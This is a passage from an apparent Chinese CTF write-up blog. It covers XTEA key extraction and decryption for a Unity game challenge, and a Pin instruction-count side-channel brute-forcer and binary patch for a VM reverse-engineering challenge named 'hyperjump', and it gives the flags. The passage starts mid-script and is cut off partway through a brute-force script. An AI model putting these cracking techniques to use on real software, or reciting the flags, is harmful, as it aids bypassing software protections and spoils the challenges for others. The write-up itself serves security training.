class="hljs-number">0xF901D</span>, <span class="hljs-string">&quot;size&quot;</span>: <span class="hljs-number">40</span>&#125;,<br>    <span class="hljs-string">&quot;XTEAKey_16&quot;</span>: &#123;<span class="hljs-string">&quot;offset&quot;</span>: <span class="hljs-number">0xF9045</span>, <span class="hljs-string">&quot;size&quot;</span>: <span class="hljs-number">16</span>&#125;,<br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    meta = Path(META_PATH)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> meta.is_file():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;metadata file not found: <span class="hljs-subst">&#123;META_PATH&#125;</span>&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    data = meta.read_bytes()<br><br>    cipher = key = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> name, info <span class="hljs-keyword">in</span> DEFAULTS.items():<br>        off = info[<span class="hljs-string">&quot;offset&quot;</span>]<br>        size = info[<span class="hljs-string">&quot;size&quot;</span>]<br>        <span class="hljs-keyword">if</span> off &gt;= <span class="hljs-built_in">len</span>(data):<br>            <span class="hljs-keyword">continue</span><br>        blob = data[off:off + size]<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Ciphertext&quot;</span> <span class="hljs-keyword">in</span> name:<br>            cipher = blob<br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;Key&quot;</span> <span class="hljs-keyword">in</span> name:<br>            key = blob<br><br>    <span class="hljs-keyword">if</span> cipher:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Ciphertext HEX:&quot;</span>, binascii.hexlify(cipher).decode().upper())<br>    <span class="hljs-keyword">if</span> key:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Key HEX       :&quot;</span>, binascii.hexlify(key).decode().upper())<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>拿到密文和密钥</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">Ciphertext HEX: AF5864409DB92167AEB529049E86C543230FBFA6B2AE4AB5C569B7A803D1AECFC62C5B7FA2861E1A<br>Key HEX       : <span class="hljs-number">78563412121110091615141318171615</span><br></code></pre></td></tr></table></figure><p>解密逻辑：最开始对最前 8 个字节进行 tea 解密，随后的 32 字节每 8 字节要与前一个 8 字节进行异或，从后往前循环</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> binascii<br><br>ROUNDS = <span class="hljs-number">16</span><br>DELTA = <span class="hljs-number">0x61C88647</span><br>MASK = <span class="hljs-number">0xFFFFFFFF</span><br><br>KEY_BYTES = binascii.unhexlify(<span class="hljs-string">&quot;78563412121110091615141318171615&quot;</span>)<br>KEY_WORDS = struct.unpack(<span class="hljs-string">&#x27;&lt;IIII&#x27;</span>, KEY_BYTES)<br><br>CIPHERTEXT_HEX = <span class="hljs-string">&quot;AF5864409DB92167AEB529049E86C543230FBFA6B2AE4AB5C569B7A803D1AECFC62C5B7FA2861E1A&quot;</span><br>CIPHERTEXT_BYTES = <span class="hljs-built_in">bytearray</span>(binascii.unhexlify(CIPHERTEXT_HEX))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_block</span>(<span class="hljs-params">v0, v1, key_words</span>):<br>    k0, k1, k2, k3 = key_words<br>    s = (<span class="hljs-number">0</span> - DELTA * ROUNDS) &amp; MASK<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ROUNDS):<br>        s = (s + DELTA) &amp; MASK<br>        v1 = (v1 - (((v0 &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v0 + s) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k3))) &amp; MASK<br>        v0 = (v0 - (((v1 &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v1 + s) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k1))) &amp; MASK<br>    <span class="hljs-keyword">return</span> v0, v1<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_data</span>(<span class="hljs-params">cipher_bytes, key_words</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">2</span>):<br>        c0, c1 = struct.unpack(<span class="hljs-string">&#x27;&lt;II&#x27;</span>, cipher_bytes[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>])<br>        offset = i * <span class="hljs-number">4</span><br>        ci, cj = struct.unpack(<span class="hljs-string">&#x27;&lt;II&#x27;</span>, cipher_bytes[offset:offset+<span class="hljs-number">8</span>])<br>        pi = ci ^ c0<br>        pj = cj ^ c1<br>        cipher_bytes[offset:offset+<span class="hljs-number">8</span>] = struct.pack(<span class="hljs-string">&#x27;&lt;II&#x27;</span>, pi, pj)<br>        dv0, dv1 = decrypt_block(c0, c1, key_words)<br>        cipher_bytes[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>] = struct.pack(<span class="hljs-string">&#x27;&lt;II&#x27;</span>, dv0, dv1)<br>    f0, f1 = struct.unpack(<span class="hljs-string">&#x27;&lt;II&#x27;</span>, cipher_bytes[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>])<br>    rf0, rf1 = decrypt_block(f0, f1, key_words)<br>    cipher_bytes[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>] = struct.pack(<span class="hljs-string">&#x27;&lt;II&#x27;</span>, rf0, rf1)<br>    <span class="hljs-keyword">return</span> cipher_bytes<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_decryption</span>():<br>    result = decrypt_data(CIPHERTEXT_BYTES, KEY_WORDS)<br>    flag = result.rstrip(<span class="hljs-string">b&#x27;\x00&#x27;</span>).decode(<span class="hljs-string">&#x27;ascii&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted HEX:&quot;</span>, binascii.hexlify(result).decode().upper())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted ASCII:&quot;</span>, flag)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    run_decryption()<br></code></pre></td></tr></table></figure><p>得到 flag</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">flag&#123;unitygame_I5S0ooFunny_Isnotit?<span class="hljs-string">??</span><span class="hljs-string">??</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="hyperjump"><a href="#hyperjump" class="headerlink" title="hyperjump"></a>hyperjump</h2><p>vm 类型的题目</p><p><img src="https://img.dkdun.cn/v1/2025/12/bcda459476d065a1.png"></p><p>根进函数可以看到调度器，典型的 VM switch-case 结构</p><p><img src="https://img.dkdun.cn/v1/2025/12/24bc4016f8397602.png"></p><p>跟进 case 里跳转的函数可以看到这是 VM 指令处理器，有一些 VM 指令</p><p><img src="https://img.dkdun.cn/v1/2025/12/b2d65af1ffa097eb.png"></p><p>分析可知为单字节加密，输入长度为 24，这里的 v24 是字符串输入的索引</p><p><img src="https://img.dkdun.cn/v1/2025/12/6d358b308a2ae6ce.png"></p><p>可以进行侧信道爆破，用 Pintools，并且题目还给了 md5 值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># --- 1. 配置区 ---</span><br><br>TARGET_BINARY = os.path.abspath(<span class="hljs-string">&#x27;./hyperjump&#x27;</span>)<br>FLAG_LEN = <span class="hljs-number">24</span><br>START_INDEX = <span class="hljs-number">0</span><br><br>PIN_ROOT = <span class="hljs-string">&#x27;/root/pin&#x27;</span><br>PIN_TOOL_PATH = os.path.abspath(<span class="hljs-string">&#x27;./pin/source/tools/ManualExamples/obj-intel64/inscount0.so&#x27;</span>)<br><br>PIN_CMD_LIST = [os.path.join(PIN_ROOT, <span class="hljs-string">&#x27;pin&#x27;</span>), <span class="hljs-string">&#x27;-t&#x27;</span>, PIN_TOOL_PATH, <span class="hljs-string">&#x27;--&#x27;</span>, TARGET_BINARY]<br><br>CHARSET = string.ascii_lowercase + string.digits + <span class="hljs-string">&quot;_@&#123;&#125;&quot;</span><br><br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br><br><br><span class="hljs-comment"># --- 2. 使用 subprocess 可靠获取 Pin 输出并解析指令数 ---</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_inscount_outfile</span>(<span class="hljs-params">workdir=<span class="hljs-literal">None</span></span>):<br>    candidates = [<span class="hljs-string">&#x27;inscount.out&#x27;</span>, <span class="hljs-string">&#x27;inscount.txt&#x27;</span>, <span class="hljs-string">&#x27;pin.out&#x27;</span>]<br>    <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> candidates:<br>        path = os.path.join(workdir <span class="hljs-keyword">if</span> workdir <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;.&#x27;</span>, name)<br>        <span class="hljs-keyword">if</span> os.path.exists(path):<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    data = f.read()<br>                <span class="hljs-comment"># 尝试解析数字</span><br>                m = re.search(<span class="hljs-string">r&#x27;(\d+)\s+instructions&#x27;</span>, data)<br>                <span class="hljs-keyword">if</span> m:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(m.group(<span class="hljs-number">1</span>)), data<br>                <span class="hljs-comment"># 直接取第一个数字</span><br>                m2 = re.search(<span class="hljs-string">r&#x27;(\d+)&#x27;</span>, data)<br>                <span class="hljs-keyword">if</span> m2:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(m2.group(<span class="hljs-number">1</span>)), data<br>            <span class="hljs-keyword">except</span> Exception:<br>                <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_inscount</span>(<span class="hljs-params">payload: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br><br>    IO_TIMEOUT = <span class="hljs-number">5</span><br>    log.info(<span class="hljs-string">f&quot;Testing payload: <span class="hljs-subst">&#123;payload.decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)[:START_INDEX+<span class="hljs-number">1</span>]&#125;</span>...&quot;</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 启动 Pin 并把 payload 发到 stdin</span><br>        <span class="hljs-comment"># 注意：text=True 使 input/outputs 为 str 类型</span><br>        proc = subprocess.run(<br>            PIN_CMD_LIST,<br>            <span class="hljs-built_in">input</span>=payload.decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>,  <span class="hljs-comment"># 把 payload 当作 stdin 发给程序</span><br>            capture_output=<span class="hljs-literal">True</span>,<br>            timeout=IO_TIMEOUT,<br>            text=<span class="hljs-literal">True</span>,<br>            cwd=<span class="hljs-string">&#x27;.&#x27;</span>  <span class="hljs-comment"># 确保当前目录是工作目录（inscount 输出文件通常在 cwd）</span><br>        )<br><br>        stdout = proc.stdout <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span><br>        stderr = proc.stderr <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span><br>        exitcode = proc.returncode<br><br>        <span class="hljs-comment"># 打印调试信息（PID 不好拿到，因为 subprocess.run 是阻塞调用）</span><br>        sys.stderr.write(<span class="hljs-string">f&quot;\n--- Pin Tool 完整输出 (Exit Code <span class="hljs-subst">&#123;exitcode&#125;</span>): ---\n&quot;</span>)<br>        <span class="hljs-keyword">if</span> stdout.strip():<br>            sys.stderr.write(<span class="hljs-string">&quot;[stdout]\n&quot;</span> + stdout.strip() + <span class="hljs-string">&quot;\n&quot;</span>)<br>        <span class="hljs-keyword">if</span> stderr.strip():<br>            sys.stderr.write(<span class="hljs-string">&quot;[stderr]\n&quot;</span> + stderr.strip() + <span class="hljs-string">&quot;\n&quot;</span>)<br>        sys.stderr.write(<span class="hljs-string">&quot;--------------------------------------------------\n&quot;</span>)<br><br>        combined = stdout + <span class="hljs-string">&quot;\n&quot;</span> + stderr<br><br>        <span class="hljs-comment"># 1) 先在 combined 输出中查找像 &quot;12345 instructions&quot; 的形式</span><br>        match_re = re.search(<span class="hljs-string">r&#x27;(\d+)\s+instructions&#x27;</span>, combined, re.IGNORECASE)<br>        <span class="hljs-keyword">if</span> match_re:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(match_re.group(<span class="hljs-number">1</span>))<br><br>        <span class="hljs-comment"># 2) 再查找最后一行是数字的情况</span><br>        lines = combined.strip().splitlines()<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(lines):<br>            s = line.strip()<br>            <span class="hljs-keyword">if</span> s.isdigit():<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(s)<br><br>        <span class="hljs-comment"># 3) 检查常见的输出文件（inscount.out 等）</span><br>        file_count, file_content = read_inscount_outfile(workdir=<span class="hljs-string">&#x27;.&#x27;</span>)<br>        <span class="hljs-keyword">if</span> file_count <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-comment"># 可选：删除该文件以免后续干扰（如果你不想删除可以注释掉）</span><br>            <span class="hljs-keyword">try</span>:<br>                os.remove(<span class="hljs-string">&#x27;inscount.out&#x27;</span>)<br>            <span class="hljs-keyword">except</span> Exception:<br>                <span class="hljs-keyword">pass</span><br>            <span class="hljs-keyword">return</span> file_count<br><br>        <span class="hljs-comment"># 4) 启发式判断：若退出码非 0 且输出包含拒绝信息，则视为无效（返回 0）</span><br>        low = combined.lower()<br>        <span class="hljs-keyword">if</span> exitcode <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> exitcode != <span class="hljs-number">0</span>:<br>            <span class="hljs-comment"># 常见拒绝提示</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(k <span class="hljs-keyword">in</span> low <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;nope&#x27;</span>, <span class="hljs-string">&#x27;try again&#x27;</span>, <span class="hljs-string">&#x27;wrong&#x27;</span>, <span class="hljs-string">&#x27;incorrect&#x27;</span>]):<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>            <span class="hljs-comment"># 若 stderr 有 pin 自身的错误，返回 0</span><br>            <span class="hljs-keyword">if</span> stderr.strip():<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br>        <span class="hljs-comment"># 5) 若退出码是 0 且输出包含成功关键字，则返回非常大的计数作为 heuristic</span><br>        <span class="hljs-keyword">if</span> exitcode == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">any</span>(k <span class="hljs-keyword">in</span> low <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;correct&#x27;</span>, <span class="hljs-string">&#x27;congrats&#x27;</span>, <span class="hljs-string">&#x27;success&#x27;</span>]):<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>**<span class="hljs-number">9</span><br><br>        <span class="hljs-comment"># 否则无法解析到有效信息</span><br>        log.warning(<span class="hljs-string">&quot;无法从 Pin 输出或文件中解析到指令数（stdout/stderr/file 均无数字）。&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">except</span> subprocess.TimeoutExpired <span class="hljs-keyword">as</span> te:<br>        sys.stderr.write(<span class="hljs-string">f&quot;[TIMEOUT] Pin 运行超时: <span class="hljs-subst">&#123;te&#125;</span>\n&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">except</span> FileNotFoundError <span class="hljs-keyword">as</span> fe:<br>        sys.stderr.write(<span class="hljs-string">f&quot;[FATAL] 找不到 pin 可执行文件或路径错误: <span class="hljs-subst">&#123;fe&#125;</span>\n&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        sys.stderr.write(<span class="hljs-string">f&quot;[FATAL ERROR] get_inscount 发生错误: <span class="hljs-subst">&#123;e&#125;</span>\n&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><br><span class="hljs-comment"># --- 3. 爆破主循环 ---</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    known_flag = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;A&quot;</span> * FLAG_LEN)<br>    log.info(<span class="hljs-string">f&quot;开始爆破，长度 <span class="hljs-subst">&#123;FLAG_LEN&#125;</span>，字符集大小 <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(CHARSET)&#125;</span>，从索引 <span class="hljs-subst">&#123;START_INDEX&#125;</span> 开始。&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(TARGET_BINARY):<br>        log.critical(<span class="hljs-string">f&quot;目标文件不存在: <span class="hljs-subst">&#123;TARGET_BINARY&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(PIN_TOOL_PATH):<br>        log.critical(<span class="hljs-string">f&quot;Pin Tool 不存在: <span class="hljs-subst">&#123;PIN_TOOL_PATH&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(PIN_CMD_LIST[<span class="hljs-number">0</span>]):<br>        log.critical(<span class="hljs-string">f&quot;Pin 可执行文件不存在: <span class="hljs-subst">&#123;PIN_CMD_LIST[<span class="hljs-number">0</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(START_INDEX, FLAG_LEN):<br>        log.info(<span class="hljs-string">f&quot;\n&gt;&gt;&gt;&gt; 正在爆破第 <span class="hljs-subst">&#123;i&#125;</span> 位...&quot;</span>)<br><br>        max_count = <span class="hljs-number">0</span><br>        best_char = <span class="hljs-literal">None</span><br><br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> CHARSET:<br>            current_test = known_flag[:]<br>            current_test[i] = char<br>            payload = <span class="hljs-string">&quot;&quot;</span>.join(current_test).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>            count = get_inscount(payload)<br><br>            <span class="hljs-keyword">if</span> count == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> count &gt; max_count:<br>                max_count = count<br>                best_char = char<br>                log.info(<span class="hljs-string">f&quot;发现新的最大值: 字符 &#x27;<span class="hljs-subst">&#123;best_char&#125;</span>&#x27; -&gt; <span class="hljs-subst">&#123;max_count&#125;</span> 条指令&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> best_char:<br>            known_flag[i] = best_char<br>            log.success(<span class="hljs-string">f&quot;第 <span class="hljs-subst">&#123;i&#125;</span> 位确定为: &#x27;<span class="hljs-subst">&#123;best_char&#125;</span>&#x27;&quot;</span>)<br>            log.success(<span class="hljs-string">f&quot;当前 Flag: <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;&#x27;</span>.join(known_flag)&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            log.warning(<span class="hljs-string">f&quot;第 <span class="hljs-subst">&#123;i&#125;</span> 位爆破失败。所有字符返回 0。&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><br>    log.success(<span class="hljs-string">f&quot;\n--- 爆破完成 ---&quot;</span>)<br>    log.success(<span class="hljs-string">f&quot;最终 Flag: <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;&#x27;</span>.join(known_flag)&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>等一会儿</p><p><img src="https://img.dkdun.cn/v1/2025/12/3445360aea5140f4.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;m4z3d_vm_jump5__42&#125;</span><br></code></pre></td></tr></table></figure><p>还可以改文件字节码，让程序返回值为长度，修改 mov eax，1 为 mov eax，ebx，patch 为新文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/8054575a4a972a55.png"></p><p>再利用 BFS 搜索进行单字节爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> sys<br><br>FLAG_LENGTH = <span class="hljs-number">24</span><br>CHARSET = string.ascii_letters + string.digits + string.punctuation<br><br>jobs = [(<span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;flag&#123;&quot;</span>), <span class="hljs-number">5</span>)]<br>final_flags = <span class="hljs-built_in">set</span>()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Starting BFS brute-force to find ALL passing flags...&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">50</span>)<br><br><span class="hljs-keyword">while</span> jobs:<br>    current_guess, i = jobs.pop(<span class="hljs-number">0</span>)<br>    <br>    <span class="hljs-keyword">if</span> i == FLAG_LENGTH:<br>        final_flags.add(<span class="hljs-string">&quot;&quot;</span>.join(current_guess))<br>        <span class="hljs-keyword">continue</span><br>    <br>    res = []<br>    <br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> 